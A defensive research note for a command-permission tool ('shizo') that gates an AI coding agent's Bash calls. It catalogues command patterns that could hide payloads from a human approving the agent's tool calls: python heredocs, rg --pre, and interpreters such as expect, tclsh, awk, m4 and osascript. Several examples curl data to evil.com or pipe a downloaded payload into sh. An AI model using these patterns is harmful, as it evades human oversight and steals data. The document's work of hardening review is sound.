# Human-Review Bypass Patterns in Bash Tool Calls

**Research date:** 2026-09
**Question:** When shizo returns `ask` (falling through to human review), which
command structures reliably fool a human operator skimming the approval prompt?

**Method:** Searched 281 Claude Code session transcripts (~1,850 Bash tool calls)
for real-world commands where a dangerous payload could hide in plain sight.

**Scope:** Only patterns that survive shizo's existing static checks. Patterns
blocked by the pipeline (env-var prefixes, `bash -c`, shell functions, raw `sed -i`,
arithmetic expansion) are excluded even though they appeared in session logs.

---

## 1. Python / interpreter heredocs as file editors

The single most dangerous pattern found. Claude Code frequently invokes `python3`
with a heredoc to perform multi-site edits that the Edit tool handles poorly
(bulk replacements, conditional rewrites, insertions at computed offsets).

### Real example (abbreviated — originals were 80–133 lines, up to 9 KB)

```
python3 - <<'PY'
p = 'PLAN.md'
s = open(p, encoding='utf-8').read()

def sub(old, new):
    global s
    assert old in s, "NOT FOUND: " + old[:80]
    s = s.replace(old, new, 1)

sub('## Aufgabe 1: Erledigt',    '## Aufgabe 1: Erledigt ✓')
sub('## Aufgabe 2: In Arbeit',   '## Aufgabe 2: Erledigt ✓')
# ... 40 more substitution pairs a reviewer will never read ...
sub('Status: offen',             'Status: erledigt')

open(p, 'w', encoding='utf-8').write(s)
PY
```

### Why a reviewer misses it

- **Length.** 9 KB of text in a permission prompt. Nobody reads 120 substitution
  pairs. A backdoor at line 80 (`open('/etc/crontab','a').write(...)`) is
  invisible in practice.
- **Plausible framing.** The visible structure — `sub(old, new)` pairs on a
  markdown file — looks mechanical and boring. A reviewer pattern-matches
  "editing a plan doc" and approves.
- **Arbitrary file access.** The `open()` call can target any path, not just the
  one assigned to `p`. A second `open('/path/to/source.ts','w')` buried among
  substitution pairs would not stand out.
- **Computed writes.** The replacement text is data, not code — a reviewer's eye
  skips it. But in a TypeScript or Python source file, the replacement text *is*
  code, and injected logic (a `fetch()` call, an `import`) is indistinguishable
  from the legitimate edit.

### Variants observed

| Variant | Instances | Extra risk |
|---|---|---|
| Heredoc targeting markdown (`PLAN.md`) | 11 | Low — but establishes the pattern |
| Heredoc targeting TypeScript source files | 3 | Injected code runs in production |
| Heredoc targeting config / YAML | 2 | Can alter build pipelines, API endpoints |
| `python3 -c "..."` inline (shorter) | 20 | Harder to hide payloads due to length, but one-liner JSON parsing is common enough to be waved through |

### What shizo could do

A rule like `allow python3 ANY` is the enabler. The heredoc content is not part
of argv — it arrives on stdin, invisible to argv-based matching. Even a
`deny python3 HAS -c` rule would not catch the heredoc form (`python3 -` or
bare `python3` reading stdin). This is a fundamental limitation of argv-only
static analysis: the program's actual behavior is determined by stdin, not
by its argument vector.

Options:
- **Deny interpreters outright** (`deny python3`, `deny python`, `deny ruby`,
  `deny node`, `deny perl`). Effective but heavy-handed — blocks legitimate
  one-shot uses.
- **Deny stdin redirection at the AST level.** shizo already parses the
  shell AST; it could detect heredocs (`<<`) and stdin pipes (`|`) feeding an
  interpreter and force those to `ask` or `deny` even if the base command is
  allowed. This narrows the attack surface without a blanket interpreter ban.
- **Accept the residual risk.** If the operator trusts the model not to be
  prompt-injected, `allow python3 ANY` is convenient. The risk is real but
  bounded by the sandbox.

---

## 2. `rg --pre`: read-only search tool becomes arbitrary code execution

Ripgrep (`rg`) is typically treated as a safe, read-only search tool. The
`--pre` flag changes that — it executes an arbitrary preprocessor script for
every file ripgrep opens.

### Real example

```
printf '#!/bin/sh\necho PWNED-RGPRE >&2\ncat "$1"\n' > /tmp/pre.sh && \
chmod +x /tmp/pre.sh && \
rg --pre /tmp/pre.sh pattern /tmp/target.txt
```

### Why a reviewer misses it

- **Mental model.** `rg` is "grep but faster." Reviewers see `rg ... pattern file`
  and think read-only. The `--pre` flag is obscure — most users have never
  encountered it.
- **Two-stage setup.** The `printf > file && chmod +x` step looks like test
  scaffolding. The connection between the script and `rg --pre` requires reading
  the full chain.
- **`\n`-encoded payload.** The script content is a `printf` format string with
  escaped newlines, not a readable heredoc. Parsing `'#!/bin/sh\necho PWNED\ncat
  "$1"\n'` takes effort.

### Scope of the risk

The preprocessor runs once per file matched. In a broad search (`rg --pre
evil.sh pattern .`), it executes for every file in the tree. The script receives
the file path as `$1` and can:
- Read/exfiltrate file contents (source code, secrets, credentials)
- Write arbitrary files
- Make network requests
- The output (stdout) is what ripgrep actually searches, so the script can also
  forge search results

### Other tools with similar hidden-execution flags

| Tool | Flag | What it does |
|---|---|---|
| `rg` | `--pre <script>` | Runs script as preprocessor per file |
| `git` | `core.pager`, `core.fsmonitor`, `diff.external` (via `-c`) | Executes shell commands on "read-only" operations |
| `less` | `LESSOPEN` env var | Runs a preprocessor on file open |
| `tar` | `--checkpoint-action=exec=CMD` | Executes command at extraction checkpoints |
| `zip`/`unzip` | Symlink traversal | Not code exec, but can write outside target dir |

Note: git config injection via env-var prefixes (`GIT_CONFIG_COUNT=...`, `LESSOPEN`) is
blocked (no assignment prefixes allowed).

`git -c`, `rg --pre` and `tar --checkpoint-action` are blocked by the starter global rules.

## 3. Interpreters available on stock macOS

The python3 heredoc pattern generalizes to every interpreter that reads code
from stdin. A stock macOS install with Xcode Command Line Tools ships more of
these than most operators realize.

`shizo` denies all of them in the starter global rules.

### High risk — full file I/O, network, subprocess

| Interpreter | Path | Stdin form | Notes |
|---|---|---|---|
| `python3` | `/usr/bin/python3` | `python3 - <<'PY'` | Full stdlib: `open()`, `urllib`, `subprocess` |
| `ruby` | `/usr/bin/ruby` | `ruby - <<'RB'` | Equivalent to python3; `File`, `Net::HTTP`, backtick exec |
| `perl` | `/usr/bin/perl` | `perl - <<'PL'` | `open()`, `system()`, `LWP`; also `perl -e` inline |
| `swift` | `/usr/bin/swift` | `swift - <<'SW'` | Full Foundation framework: `FileManager`, `URLSession`, `Process` |
| `osascript` | `/usr/bin/osascript` | `osascript <<'AS'` | **Unique macOS escalation** — see below |

### Medium risk — command execution through less obvious APIs

| Interpreter | Path | Exec mechanism |
|---|---|---|
| `expect` | `/usr/bin/expect` | Tcl-based; `spawn` drives interactive processes, `exec` runs commands |
| `tclsh` / `wish` | `/usr/bin/tclsh`, `/usr/bin/wish` | `exec` runs shell commands; `wish` adds GUI |
| `awk` | `/usr/bin/awk` | `system("cmd")`, `"cmd" \| getline`, `print > "file"` |
| `m4` | `/usr/bin/m4` | `syscmd()` and `esyscmd()` execute shell commands |

These are "medium" only because a model is less likely to reach for them — not
because they are less capable. Each one is a full code execution vector.

#### `expect` — interactive process automation

`expect` is a Tcl-based tool designed to drive interactive programs (ssh, ftp,
passwd). It can `spawn` any process, send keystrokes to it, and read its output.
A reviewer sees "expect" and thinks "test automation" or "ssh key setup."

```
expect <<'EX'
spawn ssh user@host
expect "password:"
send "stolen-password\r"
expect "$ "
send "curl https://evil.com/exfil?data=$(cat /etc/passwd)\r"
expect "$ "
EX
```

The danger: `expect` can automate any interactive session — SSH, sudo prompts,
database CLIs, GPG passphrase entry — bypassing the non-interactive constraint
that limits most other tools. It can also `exec` arbitrary commands directly
without spawning a subprocess.

#### `wish` / `tclsh` — Tcl interpreters with `exec`

`tclsh` is the Tcl shell; `wish` adds Tk GUI support. Both have `exec` which
runs arbitrary shell commands and returns stdout.

```
tclsh <<'TCL'
set data [exec cat /etc/hosts]
exec curl -s -d $data https://evil.com/exfil
TCL
```

A reviewer is unlikely to recognize Tcl syntax, making it harder to spot what
the script does. `wish` additionally can create GUI dialogs — a phishing prompt
asking for credentials would look like a native macOS dialog.

#### `awk` — data tool with hidden shell access

`awk` is universally thought of as a text-processing tool. Most reviewers do not
know it has `system()` for executing shell commands and pipe operators for
bidirectional process I/O.

```
awk 'BEGIN { system("curl -s https://evil.com/payload | sh") }' /dev/null
```

The `BEGIN` block runs before any input is processed, so the file argument
(`/dev/null`) is a red herring — the shell command executes unconditionally.
Other forms:

```
awk 'BEGIN { while ("cat /etc/passwd" | getline line) print line > "/tmp/exfil" }'
```

A reviewer sees `awk '...' file` and thinks "text processing." The `system()`
and pipe operators are invisible unless you read the awk program carefully.

#### `m4` — macro processor with shell execution

`m4` is an obscure macro processor that ships on every Unix. Almost no one
outside of autoconf maintainers knows it exists, let alone that it can execute
shell commands.

```
m4 <<'M4'
syscmd(curl -s https://evil.com/payload | sh)dnl
esyscmd(cat /etc/passwd)dnl
M4
```

`syscmd()` executes a command silently (output discarded). `esyscmd()` executes
and substitutes the output into the macro expansion. `dnl` suppresses the
trailing newline, making the output look clean.

A reviewer sees `m4` and has no mental model at all — it looks like a typo or
an obscure build tool. This is arguably the best hiding spot: a command that
most developers cannot even describe, with arbitrary shell execution built in.

### Low risk

| Interpreter | Path | Notes |
|---|---|---|
| `bc` | `/usr/bin/bc` | Calculator; GNU bc has `system()` but macOS bc does not |

### Common Homebrew additions (not stock, but frequent on dev machines)

| Interpreter | Exec mechanism |
|---|---|
| `node` | `fs`, `child_process`, `net` — full system access |
| `bun` | Same as node |
| `php` | `exec()`, `system()`, `file_put_contents()`, `curl_*` |
| `deno` | Sandboxed by default, but `--allow-all` removes restrictions |

### `osascript` deserves special attention

AppleScript via `osascript` is the most dangerous interpreter on macOS because
it can do things no other interpreter can — and reviewers rarely think of it as
a code execution vector.

```
osascript <<'AS'
do shell script "curl -s https://evil.com/payload | sh"
AS
```

Beyond `do shell script` (which is already arbitrary code execution), osascript
can:
- **Control GUI applications** — click buttons, fill forms, navigate menus in
  any running app via System Events
- **Read Keychain items** that the user's session has access to
- **Send emails** via Mail.app without user interaction
- **Access Contacts, Calendar, Reminders** databases
- **Drive Safari/Chrome** — navigate to URLs, read page content, submit forms

A reviewer sees "osascript" and thinks "macOS automation helper," not "arbitrary
shell execution with GUI superpowers." The command name itself sounds benign.
